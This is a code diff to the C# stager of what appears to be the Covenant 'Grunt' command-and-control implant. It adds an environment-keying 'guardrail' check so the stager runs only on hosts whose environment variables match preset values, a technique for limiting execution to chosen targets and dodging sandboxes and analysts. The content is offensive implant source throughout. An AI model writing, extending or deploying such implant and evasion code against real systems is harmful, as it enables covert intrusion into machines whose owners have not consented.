@@ -14,11 +14,15 @@ namespace GruntStager
     {
         public GruntStager()
         {
-            ExecuteStager();
+            string Guardrails = @"{{REPLACE_GUARDRAILS}}";
+            
+            if (EnvCheck(Guardrails)){
+                ExecuteStager();
+            }
         }
         [STAThread]
         public static void Main(string[] args)
-        {
+        {	
             new GruntStager();
         }
         public static void Execute()
@@ -207,7 +211,25 @@ namespace GruntStager
             }
             catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }
         }
-
+		
+        public bool EnvCheck(string envString)
+        {
+            if (String.IsNullOrEmpty(envString))
+            {
+                return true;
+            }
+            List<string> envSplitted = envString.Split(';').ToList<string>();
+            foreach (string s in envSplitted)
+            {
+                if (!System.Environment.GetEnvironmentVariable(s.Split('=')[0]).Equals(s.Split('=')[1], StringComparison.InvariantCultureIgnoreCase))
+                {    
+                   return false;
+                }
+            }
+            return true;
+        }
+		
+		
         public class CookieWebClient : WebClient
         {
             public CookieContainer CookieContainer { get; private set; }
